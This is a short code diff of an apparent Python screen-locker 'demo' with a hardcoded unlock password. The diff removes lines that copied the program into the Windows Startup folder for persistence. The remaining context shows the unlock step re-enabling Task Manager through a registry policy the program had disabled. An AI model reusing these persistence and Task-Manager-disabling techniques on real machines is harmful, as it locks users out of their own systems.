@@ -24,8 +24,6 @@ password = "ziD#^TafeOaRjI^9Z@aK"
 
 path = sys.argv[0]
 file_name = path.split('\\')[-1]
-startup_path = '"%Appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"'
-os.system(f'copy {path} {startup_path}')
 
 
 root = tk.Tk()
@@ -373,7 +371,6 @@ def show_menu():
                 text="DEMO UNLOCKED!",
                 fg="#00ff66"
             )
-            os.system(f'del {startup_path+file_name}')
             os.system(
                 'REG DELETE "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
                 '/v "DisableTaskMgr" /f'
